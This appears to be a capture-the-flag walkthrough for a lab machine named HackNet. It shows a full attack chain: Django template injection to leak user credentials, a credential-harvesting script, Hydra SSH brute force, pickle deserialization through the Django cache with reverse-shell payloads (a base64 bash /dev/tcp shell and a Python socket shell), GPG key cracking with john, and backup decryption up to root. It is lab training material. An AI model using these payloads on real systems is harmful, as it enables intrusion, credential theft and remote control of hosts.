### Nmap
```bash
nmap -sV -sC -vv 10.10.11.85
Nmap scan report for 10.10.11.85
Host is up, received reset ttl 63 (0.019s latency).
Scanned at 2025-12-03 20:02:28 EST for 7s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 95:62:ef:97:31:82:ff:a1:c6:08:01:8c:6a:0f:dc:1c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ8BFa2rPKTgVLDq1GN85n/cGWndJ63dTBCsAS6v3n8j85AwatuF1UE+C95eEdeMPbZ1t26HrjltEg2Dj+1A2DM=
|   256 5f:bd:93:10:20:70:e6:09:f1:ba:6a:43:58:86:42:66 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFOSA3zBloIJP6JRvvREkPtPv013BYN+NNzn3kcJj0cH
80/tcp open  http    syn-ack ttl 63 nginx 1.22.1
|_http-title: Did not follow redirect to http://hacknet.htb/
|_http-server-header: nginx/1.22.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


![[Pasted image 20251203200359.png]]

- Creating new user
![[Pasted image 20251203200452.png]]
`test@test.com:test:test`
![[Pasted image 20251203200552.png]]

- Looking at framework from wappalyzer I see Django. Which leads to testing for SSTI vulnerability:
![[Pasted image 20251203212056.png]]

- When we explore posts, we can like them, and if we hover over likes we see some profile pictures. 
- checking the network or from burp suite we see calls to `/like` and `/likes/`. If we check the source code for likes we see the list of users under title:
![[Pasted image 20251203212234.png]]
- We can change our name to `{{users.values}}` to get an output here.
	- Edit name to `{{ users.values }}`
- Relike and hover over likes to initiate the call to `/likes`. then access source code of likes to find list of usernames and passwords of the people who likes it :
![[Pasted image 20251203212401.png]]
```
mail : ciphermail

users:
hexhunter : H3xHunt3r! : hexhunter@ciphermail.com
rootbreaker : R00tBr3@ker# : rootbreaker@exploitmail.net&
zero_day : Zer0D@yH@ck : zero_day@hushmail.com
shadowcaster : Sh@d0wC@st! : shadowcaster@darkmail.net
blackhat_wolf : Bl@ckW0lfH@ck : blackhat_wolf@cypherx.com
bytebandit : Byt3B@nd!t123 : bytebandit@exploitmail.net
glitch : Gl1tchH@ckz : glitch@cypherx.com
phreaker : Phre@k3rH@ck : phreaker@securemail.org
codebreaker : C0d3Br3@k! : codebreaker@ciphermail.com
netninja : N3tN1nj@2024 : netninja@hushmail.com
packetpirate : P@ck3tP!rat3 : packetpirate@exploitmail.net
darkseeker : D@rkSeek3r# : darkseeker@darkmail.net
trojanhorse : Tr0j@nH0rse! : trojanhorse@securemail.org
exploit_wizard : Expl01tW!zard : exploit_wizard@hushmail.com
whitehat : Wh!t3H@t2024 : whitehat@darkmail.net
deepdive : D33pD!v3r : deepdive@hacknet.htb
virus_viper : V!rusV!p3r2024 : virus_viper@securemail.org
brute_force : BrUt3F0rc3# : brute_force@ciphermail.com
shadowwalker : Sh@dowW@lk2024 : shadowwalker@hushmail.com

```
- but this only lists those that liked that very post. 
- also note when we like it the `/likes` gets updated and so we can read the data after we do our SSTi injection.
- We use this script
```
import re
import requests
import html

url = "http://hacknet.htb"
headers = {
    'Cookie': "csrftoken=WxjIMtJuLEsjxZUwEcGqStmg4OGoSZHAf; sessionid=scr7vt6539ppamfbreor033ivzfen0e6"
}

all_users = set()

for i in range(1, 31):
    # Like
    requests.get(f"{url}/like/{i}", headers=headers)

    # Get the likes list
    text = requests.get(f"{url}/likes/{i}", headers=headers).text

    # Find the last <img> title and decode HTML entities
    img_titles = re.findall(r'<img [^>]*title="([^"]*)"', text)
    if not img_titles:
        continue
    last_title = html.unescape(img_titles[-1])

    # If there is no QuerySet, like once more
    if "<QuerySet" not in last_title:
        requests.get(f"{url}/like/{i}", headers=headers)
        text = requests.get(f"{url}/likes/{i}", headers=headers).text
        img_titles = re.findall(r'<img [^>]*title="([^"]*)"', text)
        if img_titles:
            last_title = html.unescape(img_titles[-1])

    # Match email and password separately
    emails = re.findall(r"'email': '([^']*)'", last_title)
    passwords = re.findall(r"'password': '([^']*)'", last_title)

    # Email prefix + password
    for email, p in zip(emails, passwords):
        username = email.split('@')[0]  # Take the email prefix
        all_users.add(f"{username}:{p}")

# Output deduplicated username:password pairs
for item in all_users:
    print(item)
```

- I execute it and send the output to `creds` file:
```bash
python3 try.py > creds
```

- Then using hydra I brute force ssh with these creds to get a hit on `mikey` user:
![[Pasted image 20251203222207.png]]
```
hydra -C creds ssh://hacknet.htb -I
---OUTPUT---
[22][ssh] host: hacknet.htb   login: mikey   password: mYd4rks1dEisH3re
```

- I login and grab user flag:
```
ssh mikey@hacknet.htb
```
![[Pasted image 20251203222319.png]]

- With linpeas I notice a world writeable file at `/var/tmp.django_cache`
## New kind of exploit
- So basically if we know the location of django cache and can write into it, we can basically write our injected payload/serialization onto this file which when processed by django to do code execution.
- Basically when we click on explore, django cache files are created. You can see these files on this location when we click on explore tab. Also if we check the `views.py` file in `/var/www/Hacknet/SocialNetwork..` we can see a call ` @@cache`
- So we can use one of these exploits. The goal is use the malicious payload which basically abuses the pickle function to execute commands and add it to the cache file. This file when triggered by accessing explore page again will execute our code.
- Basically uses this vulnerable code:
```
import base64
import os
import pickle

class Blah(object):
    def __reduce__(self):
        return (os.system, ("netcat -c '/bin/bash -i' -l -p 1234",))

```
- Then writes it to the cache file.
- This exploit works well:
```
import pickle
import base64
import os
import time

# ---- Configuration ----

cache_dir = "/var/tmp/django_cache"
cmd = "printf KC9iaW4vYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40Ny85OTk5IDA+JjEpCg==|base64 -d|bash"

# ---- Generate Pickle payload ----

class RCE:
    def __reduce__(self):
        return (os.system, (cmd,),)

payload = pickle.dumps(RCE())

# ---- Write payload into each cache file ----

for filename in os.listdir(cache_dir):
    if filename.endswith(".djcache"):
        path = os.path.join(cache_dir, filename)
        try:
            os.remove(path)  # Delete original file
        except:
            continue
        with open(path, "wb") as f:
            f.write(payload)  # Write pickle payload
        print(f"[+] Written payload to {filename}")
```
- To exploit, first load the explore page on browser to generate the cache files. (you have about 60 seconds after this)
- Then execute the python file.
- Reload the explore page with your netcat listener ready to grab the shell as user `sandy`

- Alternatively can use this exploit followed by the shell script to first generate the payload and then add it to the cache file based on the cache name:
	- payload;
```
import pickle
import base64
import os

YOUR_IP = "10.10.14.47"
YOUR_PORT = "9999"

class ReverseShell:
    def __reduce__(self):
        cmd = f"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{YOUR_IP}\",{YOUR_PORT}));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/bash\")'"
        return (os.system, (cmd,))

# Create the pickled payload
payload = pickle.dumps(ReverseShell())

# Encode in base64 for easy storage
payload_b64 = base64.b64encode(payload).decode()

# Save to file
with open('/tmp/payload.b64', 'w') as f:
    f.write(payload_b64)

print(f"Payload created: /tmp/payload.b64")
print(f"Payload size: {len(payload_b64)} chars")
print(f"Start listener: nc -lvnp {YOUR_PORT}")
```
- then execute this script. Remember to change the name of the cache files to what is generated in your session:
```
cd /var/tmp/django_cache

# Delete existing cache files and replace with your payload
for i in 1f0acfe7480a469402f1852f8313db86.djcache 90dbab8f3b1e54369abdeb4ba1efc106.djcache; do
    rm -f "$i"
    cat /tmp/payload.b64 | base64 -d > "$i"
    chmod 777 "$i"
    echo "Replaced: $i"
done# Let's replace one of the existing cache files with our pickle payload
cp exploit.pickle 01866fb83c241f0c42a9f14275d1afb5.djcache
```

- Now we get shell as user sandy.
![[Pasted image 20251204083624.png]]

- Looking at `sandy`'s home directory I find a hidden `gnpg` directory which holds some private keys. One of them is `armored_key.asc` which doesn't change (while the others keep changing, new generated/old delted maybe)
![[Pasted image 20251204083707.png]]
![[Pasted image 20251204083826.png]]

- Looking online I see I can crack it with john.
- I copy the file locally and pass the following command to retrieve a hash
```
gpg2john key                                        

---OUTPUT---
File key
Sandy:$gpg$*1*348*1024*db7e6d165a1d86f43276a4a61a9865558a3b67dbd1c6b0c25b960d293cd490d0f54227788f93637a930a185ab86bc6d4bfd324fdb4f908b41696f71db01b3930cdfbc854a81adf642f5797f94ddf7e67052ded428ee6de69fd4c38f0c6db9fccc6730479b48afde678027d0628f0b9046699033299bc37b0345c51d7fa51f83c3d857b72a1e57a8f38302ead89537b6cb2b88d0a953854ab6b0cdad4af069e69ad0b4e4f0e9b70fc3742306d2ddb255ca07eb101b07d73f69a4bd271e4612c008380ef4d5c3b6fa0a83ab37eb3c88a9240ddeda8238fd202ccc9cf076b6d21602dd2394349950be7de440618bf93bcde73e68afa590a145dc0e1f3c87b74c0e2a96c8fe354868a40ec09dd217b815b310a41449dc5fbdfca513fadd5eeae42b65389aecc628e94b5fb59cce24169c8cd59816681de7b58e5f0d0e5af267bc75a8efe0972ba7e6e3768ec96040488e5c7b2aa0a4eb1047e79372b3605*3*254*2*7*16*db35bd29d9f4006bb6a5e01f58268d96*65011712*850ffb6e35f0058b:::Sandy (My key for backups) <sandy@hacknet.htb>::key
```
![[Pasted image 20251204084123.png]]

- I then crack the hash with john:
```
john hash --wordlist=/usr/share/wordlists/rockyou.txt


---OUTPUT---
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65011712 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 7 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sweetheart       (?)     
1g 0:00:00:04 DONE (2025-12-04 07:34) 0.2036g/s 86.35p/s 86.35c/s 86.35C/s 246810..ladybug
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
![[Pasted image 20251204084157.png]]
- I get the passphrase `sweetheart`

- Looking online further I see I can decrypt gpg files with this key.
	- There are `sql.gpg` files in Hacknets backup directory. I crack each with the following command. I end up finding the information I need from the decrypted backup02 file
```
gpg --batch --yes --pinentry-mode loopback \
    --passphrase "sweetheart" \
    -o backup02.sql -d backup02.sql.gpg
```
- I use `--pinentry-mode` as i was receiving screen to small error probably due to the shell i have. Not sure if it matters as I export the output to a file.
- Then on reading the file I find something interesting
![[Pasted image 20251204084856.png]]

- Alternatively I found this script than auomates it and decrypts all : (havent checked)
```
#!/bin/bash
# 批量解密 HackNet 备份文件

# 配置
KEY_PATH="$HOME/.gnupg/private-keys-v1.d/armored_key.asc"
BACKUP_DIR="/var/www/HackNet/backups"
OUTPUT_DIR="/tmp"
PASSPHRASE="I CANT TELL YOU"  # 如果没有密码就留空

# 导入私钥
gpg --import "$KEY_PATH"

# 批量解密
for file in "$BACKUP_DIR"/*.gpg; do
    filename=$(basename "$file" .gpg)
    outpath="$OUTPUT_DIR/$filename.sql"
    echo "[*] Decrypting $file → $outpath"
    if [ -n "$PASSPHRASE" ]; then
        gpg --batch --yes --passphrase "$PASSPHRASE" --pinentry-mode loopback -o "$outpath" -d "$file"
    else
        gpg --batch --yes -o "$outpath" -d "$file"
    fi
done

echo "[*] Done. Decrypted files are in $OUTPUT_DIR"

```

- I see the root password for MYSQL is `h4ck3rs4re3veRywh3re99`

- Using this I can switch to root user and grab the root flag:
![[Pasted image 20251204085137.png]]

